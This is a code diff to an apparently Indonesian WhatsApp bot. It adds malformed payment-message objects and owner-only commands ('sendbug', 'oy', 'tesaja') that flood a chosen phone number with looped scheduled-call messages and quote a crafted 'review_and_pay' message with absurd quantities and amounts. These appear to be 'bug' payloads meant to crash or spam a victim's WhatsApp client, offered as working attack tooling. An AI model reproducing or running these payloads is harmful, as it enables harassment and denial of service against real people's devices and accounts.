@@ -297,6 +297,28 @@ const fpayment = {
 "text": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
 }
 }}}}
+const kalgans = { 
+key: {
+fromMe: [], 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
+},
+
+'message': {
+	"interactiveMessage": {
+						"header": {
+						
+							"hasMediaAttachment": [],
+							"jpegThumbnail": thumb,
+													},
+						"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"💖𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏💖\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":7777777}]}}"
+}
+]
+			}
+}}}
 //===================SHINCHAN XD=========================//
 if (vn) {
 let allct = await store.chats.all().map(v => v.id)
@@ -414,8 +436,8 @@ if (command) {
 conn.readMessages([m.key])
 }
 }
-// Public & Self
-      if (!conn.public) {
+// itunya
+      if (!conn.self) {
          if (!m.key.fromMe && !isCreator) return
       }
 /*let rn = ['recording']
@@ -1495,6 +1517,41 @@ await sleep(60* secon)
 }
 }
 break
+case 'sendbug': {
+if (!isCreator) return m.reply(`*khusus Owner*`)
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+ var call = {
+ scheduledCallCreationMessage: {
+ callType: 2,
+ scheduledTimestampMs:  Date.now(),
+ title: `${weg}\n${tizi}`
+ }
+}
+conn.relayMessage(nomor, call, {})
+}
+}
+break
+case 'oy': {
+if (!isCreator) return m.reply("ngapain?") 
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+for (let i = 0; i < jumlah ; i++){
+ var call = {
+ scheduledCallCreationMessage: {
+ callType: 2,
+ scheduledTimestampMs:  Date.now(),
+ title: `${weg}\n${tizi}`
+ }
+}
+conn.relayMessage(nomor, call, {})
+}
+}
+break
 case 'sendbuggc': {
 if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@g.us'
@@ -1593,6 +1650,12 @@ await sleep(1000)
 conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
 await sleep(1000)
 }
+}
+break
+case 'tesaja': {
+if (!isCreator) return m.reply(`*khusus Owner*`)
+conn.sendMessage(m.chat, {text: `nyenye`}, {quoted: kalgans})
+await sleep(1000)
 }
 break
 case 'bugtxt': {
